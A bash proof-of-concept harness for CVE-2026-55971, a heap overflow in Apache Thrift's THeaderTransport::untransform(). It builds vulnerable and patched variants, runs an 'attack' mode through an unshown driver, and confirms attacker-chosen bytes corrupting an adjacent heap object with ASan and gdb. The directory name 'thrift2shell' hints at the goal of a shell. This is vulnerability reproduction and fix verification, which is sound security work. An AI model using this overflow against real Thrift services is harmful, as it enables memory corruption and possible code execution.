#!/bin/bash
# CVE-2026-55971 / Apache Thrift THeaderTransport::untransform() heap overflow.
# Re-extracts the complete verbatim function from four byte-exact pinned blobs,
# checks both SHA-256 manifests and git blob identities, builds plain and ASan
# variants, and drives rungs 1-4. No daemon, socket, server or network.
set -u
export ASAN_OPTIONS=detect_leaks=0
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E" vuln rel023 fix rel024
rm -f "$E"/*.out "$E"/*.log "$E"/normalized.txt \
      vuln/*.inc rel023/*.inc fix/*.inc rel024/*.inc \
      p-vuln p-rel023 p-fix p-rel024 a-vuln-gcc a-fix-gcc \
      a-rel023-gcc a-rel024-gcc a-vuln-clang

PASS=0
FAIL=0
ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() { if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi; }
hasnt() { if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi; }
count() {
  if [ "$(grep -cF "$2" "$1" 2>/dev/null)" = "$3" ]; then ok "$4"; else no "$4"; fi
}
hasre() { if grep -qE "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi; }

# --- verbatim slices: complete function from pinned bytes, every run ---------
# Bounds found by brace matching on each pinned blob; raw bytes rule.
{ echo '#line 263 "THeaderTransport.cpp.v0.23.0"'; sed -n '263,308p' ../src/THeaderTransport.cpp.v0.23.0; } > vuln/untransform.inc
{ echo '#line 282 "THeaderTransport.cpp.parent"';   sed -n '282,327p' ../src/THeaderTransport.cpp.parent; } > rel023/untransform.inc
{ echo '#line 282 "THeaderTransport.cpp.fix"';      sed -n '282,333p' ../src/THeaderTransport.cpp.fix; } > fix/untransform.inc
{ echo '#line 286 "THeaderTransport.cpp.v0.24.0"';  sed -n '286,337p' ../src/THeaderTransport.cpp.v0.24.0; } > rel024/untransform.inc

(cd ../src && sha256sum -c SHA256SUMS) > "$E/hashcheck.out" 2>&1 \
  && ok 'src-sha256-manifest' || no 'src-sha256-manifest'
count "$E/hashcheck.out" ': OK' 9 'all-9-pinned-source-files-match'
sha256sum -c SHA256SUMS > "$E/hashcheck-harness.out" 2>&1 \
  && ok 'harness-sha256-manifest' || no 'harness-sha256-manifest'
count "$E/hashcheck-harness.out" ': OK' 15 'all-15-harness-and-pin-files-match'

# Git blob identity: the fix patch's preimage/postimage indexes are authoritative.
GB="$(git hash-object ../src/THeaderTransport.cpp.parent)"
if [ "${GB#cdf29cf3d53}" != "$GB" ]; then ok 'parent-blob-matches-fix-preimage'; else no 'parent-blob-matches-fix-preimage'; fi
GF="$(git hash-object ../src/THeaderTransport.cpp.fix)"
if [ "${GF#891059b888e}" != "$GF" ]; then ok 'fix-blob-matches-fix-postimage'; else no 'fix-blob-matches-fix-postimage'; fi

count ../src/fix-db4a473f.patch 'std::swap(rBufSize_, tBufSize_);' 1 'fix-patch-swaps-sizes'
count vuln/untransform.inc 'memcpy(ptr, tBuf_.get(), sz);' 1 'v0.23.0-memcpy-verbatim'
count rel023/untransform.inc 'memcpy(ptr, tBuf_.get(), sz);' 1 'parent-memcpy-verbatim'
count fix/untransform.inc 'rBuf_.swap(tBuf_);' 1 'fix-swap-verbatim'
count rel024/untransform.inc 'rBuf_.swap(tBuf_);' 1 'v0.24.0-swap-verbatim'
hasnt fix/untransform.inc 'memcpy(ptr, tBuf_.get(), sz);' 'fix-has-no-copyback'

build_plain() {
  g++ -O0 -g -fno-stack-protector -std=c++11 \
      -DVARIANT_INC="\"$1\"" -DVARIANT_NAME="\"$2\"" \
      driver.cpp -o "$3" -lz 2> "$E/build-$3.log"
}
build_asan() {
  "$4" -O0 -g -fno-omit-frame-pointer -fsanitize=address -std=c++11 \
      -DVARIANT_INC="\"$1\"" -DVARIANT_NAME="\"$2\"" \
      driver.cpp -o "$3" -lz 2>> "$E/build-asan.log"
}
build_plain vuln/untransform.inc   vuln-0e4a47ea    p-vuln
build_plain rel023/untransform.inc parent-0e4a47ea  p-rel023
build_plain fix/untransform.inc    fix-db4a473f     p-fix
build_plain rel024/untransform.inc release-v0.24.0  p-rel024
for B in p-vuln p-rel023 p-fix p-rel024; do
  if [ -x "$B" ]; then ok "build-$B"; else no "build-$B"; fi
done
: > "$E/build-asan.log"
build_asan vuln/untransform.inc   vuln-0e4a47ea   a-vuln-gcc   g++
build_asan fix/untransform.inc    fix-db4a473f    a-fix-gcc    g++
build_asan rel023/untransform.inc parent-0e4a47ea a-rel023-gcc g++
build_asan rel024/untransform.inc release-v0.24.0 a-rel024-gcc g++
for B in a-vuln-gcc a-fix-gcc a-rel023-gcc a-rel024-gcc; do
  if [ -x "$B" ]; then ok "build-$B"; else no "build-$B"; fi
done
if command -v clang++ >/dev/null 2>&1; then
  build_asan vuln/untransform.inc vuln-0e4a47ea a-vuln-clang clang++
  if [ -x a-vuln-clang ]; then ok 'build-a-vuln-clang'; else no 'build-a-vuln-clang'; fi
fi

# --- rung 1: pinned arithmetic, no vulnerable call ---------------------------
./p-vuln arith > "$E/arith-vuln.out" 2>&1
hasre "$E/arith-vuln.out" 'COMPRESSED_LEN=[0-9]+ DECOMPRESSED_LEN=700 DEST_BYTES=[0-9]+ OVERFLOW_BYTES=[0-9]+ TBUF_SIZE=1024' 'r1-pinned-arithmetic'
hasre "$E/arith-vuln.out" 'OVERFLOW_BYTES=6[0-9][0-9]' 'r1-overflow-hundreds-of-bytes'
./p-fix arith > "$E/arith-fix.out" 2>&1
has "$E/arith-fix.out" 'DECOMPRESSED_LEN=700' 'r1-fixed-blob-same-input-geometry'

# --- rungs 2/4: vulnerable smears chosen bytes; fixed swaps buffers ----------
./p-vuln attack > "$E/plain-vuln-attack.out" 2>&1 || true
has "$E/plain-vuln-attack.out" 'VARIANT=vuln-0e4a47ea MODE=attack COMPRESSED_LEN=31 DECOMPRESSED_LEN=700' 'r2-vuln-variant-and-payload'
has "$E/plain-vuln-attack.out" 'SET_CALLS=1 SET_SIZE=700 SETPTR_IS_RBUF=1 SETPTR_IS_ORIG_TBUF=0' 'r2-vuln-copies-back-into-receive-buffer'
has "$E/plain-vuln-attack.out" 'DST_UNCHANGED=0' 'r2-vuln-receive-buffer-overwritten'
hasre "$E/plain-vuln-attack.out" 'SINK_DIST=[0-9]+ SINK_BYTE_1=42 SINK_BYTE_8=42 SINK_BYTE_16=3c' 'r4-vuln-adjacent-heap-object-corrupted'
for pair in '0:41' '16:5a' '32:7a' '64:3c' '128:7b' '256:42' '699:7b'; do
  has "$E/plain-vuln-attack.out" "OBS_OFFSET_${pair%%:*}=${pair##*:}" "r4-vuln-chosen-byte-${pair%%:*}"
done
./p-rel023 attack > "$E/plain-rel023-attack.out" 2>&1 || true
has "$E/plain-rel023-attack.out" 'VARIANT=parent-0e4a47ea MODE=attack COMPRESSED_LEN=31 DECOMPRESSED_LEN=700' 'r2-parent-vulnerable'
has "$E/plain-rel023-attack.out" 'SETPTR_IS_RBUF=1' 'r2-parent-copies-back'
./p-fix attack > "$E/plain-fix-attack.out" 2>&1 || true
has "$E/plain-fix-attack.out" 'VARIANT=fix-db4a473f MODE=attack COMPRESSED_LEN=31 DECOMPRESSED_LEN=700' 'r2-fix-variant'
has "$E/plain-fix-attack.out" 'SET_CALLS=1 SET_SIZE=700 SETPTR_IS_RBUF=0 SETPTR_IS_ORIG_TBUF=1' 'r2-fix-reads-from-swapped-transform-buffer'
has "$E/plain-fix-attack.out" 'DST_UNCHANGED=1' 'r2-fix-receive-buffer-untouched'
has "$E/plain-fix-attack.out" 'SINK_BYTE_1=cc SINK_BYTE_8=cc SINK_BYTE_16=cc' 'r2-fix-no-smear-into-adjacent-object'
has "$E/plain-fix-attack.out" 'OBS_OFFSET_64=OOB' 'r2-fix-no-smear-past-frame'
./p-rel024 attack > "$E/plain-rel024-attack.out" 2>&1 || true
has "$E/plain-rel024-attack.out" 'SETPTR_IS_ORIG_TBUF=1' 'r2-released-v0.24.0-swaps'
has "$E/plain-rel024-attack.out" 'SINK_BYTE_1=cc' 'r2-released-v0.24.0-no-smear'

# existing gate: > transform buffer rejected before any copy or swap
for B in vuln rel023 fix rel024; do
  ./p-$B oversize > "$E/oversize-$B.out" 2>&1 || true
  has "$E/oversize-$B.out" 'THREW=6 MSG=Error while zlib deflate' "gate-oversize-rejected-$B"
done

# safe input: 4-byte payload, in bounds in every variant
for B in vuln rel023 fix rel024; do
  ./p-$B safe > "$E/safe-$B.out" 2>&1 || true
  has "$E/safe-$B.out" 'TBUF_OBS_0=42' "safe-$B-inbounds-byte"
done

# --- rung 3: ASan WRITE of the decompressed payload past the frame buffer ----
./a-vuln-gcc attack > "$E/vuln-gcc-asan.out" 2>&1 || true
has "$E/vuln-gcc-asan.out" 'ERROR: AddressSanitizer: heap-buffer-overflow' 'r3-gcc-asan-overflow'
has "$E/vuln-gcc-asan.out" 'WRITE of size 700' 'r3-gcc-asan-write700'
has "$E/vuln-gcc-asan.out" 'THeaderTransport.cpp.v0.23.0:301' 'r3-gcc-asan-at-pinned-line-301'
has "$E/vuln-gcc-asan.out" 'untransform' 'r3-gcc-asan-in-function'
hasre "$E/vuln-gcc-asan.out" '[0-9]+-byte region' 'r3-gcc-asan-frame-sized-victim-region'
if [ -x a-vuln-clang ]; then
  ./a-vuln-clang attack > "$E/vuln-clang-asan.out" 2>&1 || true
  has "$E/vuln-clang-asan.out" 'heap-buffer-overflow' 'r3-clang-asan-overflow'
  has "$E/vuln-clang-asan.out" 'WRITE of size 700' 'r3-clang-asan-write700'
  has "$E/vuln-clang-asan.out" 'THeaderTransport.cpp.v0.23.0:301' 'r3-clang-asan-at-pinned-line-301'
fi
./a-rel023-gcc attack > "$E/rel023-gcc-asan.out" 2>&1 || true
has "$E/rel023-gcc-asan.out" 'WRITE of size 700' 'r3-parent-asan-write700'
has "$E/rel023-gcc-asan.out" 'THeaderTransport.cpp.parent:320' 'r3-parent-asan-at-pinned-line-320'
./a-fix-gcc attack > "$E/fix-gcc-asan.out" 2>&1 || true
hasnt "$E/fix-gcc-asan.out" 'ERROR: AddressSanitizer' 'fix-asan-clean'
has "$E/fix-gcc-asan.out" 'SETPTR_IS_ORIG_TBUF=1' 'fix-asan-bounded-read'
./a-rel024-gcc attack > "$E/rel024-gcc-asan.out" 2>&1 || true
hasnt "$E/rel024-gcc-asan.out" 'ERROR: AddressSanitizer' 'v0.24.0-asan-clean'
has "$E/rel024-gcc-asan.out" 'SETPTR_IS_ORIG_TBUF=1' 'v0.24.0-asan-bounded-read'

# --- rung 4: gdb observes attacker bytes at pinned source line ---------------
if command -v gdb >/dev/null 2>&1; then
  gdb -q -batch \
      -ex 'set pagination off' \
      -ex 'break THeaderTransport.cpp.v0.23.0:301' \
      -ex 'run attack' \
      -ex 'frame 1' \
      -ex 'print (int)comp_len' \
      -ex 'print (unsigned char)payload[16]' \
      -ex 'print (unsigned char)payload[64]' \
      -ex 'frame 0' \
      -ex 'continue' \
      ./p-vuln > "$E/gdb-vuln.out" 2>&1 || true
  has "$E/gdb-vuln.out" 'Breakpoint 1' 'r4-gdb-hit-pinned-line'
  hasre "$E/gdb-vuln.out" '\$1 = 31' 'r4-gdb-frame-size'
  hasre "$E/gdb-vuln.out" '\$2 = 90' 'r4-gdb-chosen-byte-16'
  hasre "$E/gdb-vuln.out" '\$3 = 60' 'r4-gdb-chosen-byte-64'
  gdb -q -batch \
      -ex 'set pagination off' \
      -ex 'break THeaderTransport.cpp.fix:328' \
      -ex 'run attack' \
      -ex 'frame 1' \
      -ex 'print (int)comp_len' \
      -ex 'print (unsigned char)payload[16]' \
      -ex 'frame 0' \
      -ex 'continue' \
      ./p-fix > "$E/gdb-fix.out" 2>&1 || true
  has "$E/gdb-fix.out" 'Breakpoint 1' 'r4-gdb-fix-hit-swap-line'
fi

# --- deterministic normalized trace: no PID, address, path or build id -------
{
  cat "$E/hashcheck.out" "$E/hashcheck-harness.out"
  cat "$E/arith-vuln.out" "$E/arith-fix.out"
  for B in vuln rel023 fix rel024; do cat "$E/plain-$B-attack.out" "$E/oversize-$B.out" "$E/safe-$B.out"; done
  cat "$E/vuln-gcc-asan.out" "$E/rel023-gcc-asan.out" "$E/fix-gcc-asan.out" "$E/rel024-gcc-asan.out"
  [ -f "$E/vuln-clang-asan.out" ] && cat "$E/vuln-clang-asan.out"
  [ -f "$E/gdb-vuln.out" ] && cat "$E/gdb-vuln.out"
  [ -f "$E/gdb-fix.out" ] && cat "$E/gdb-fix.out"
} | grep -vE '^==[0-9]+==(AddressSanitizer|SUMMARY|Shadow|WARNING|    #|[ ]*$)' \
  | sed -E 's#/[^ ]*/thrift2shell/harness/#HARNESS/#g; s#/[^ ]*/harness/#HARNESS/#g; s/BuildId: [0-9a-f]+/BuildId: BUILDID/g; s/0x[0-9a-f]+/0xADDR/g; s/#[0-9]+ /#FRAME /g; s/==[0-9]+==/==PID==/g; s/process [0-9]+/process PID/g' > "$E/normalized.txt"
TRACE=$(sha256sum "$E/normalized.txt" | cut -d' ' -f1)
printf 'TRACE_SHA256=%s\n' "$TRACE"
printf 'PASS=%d FAIL=%d\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
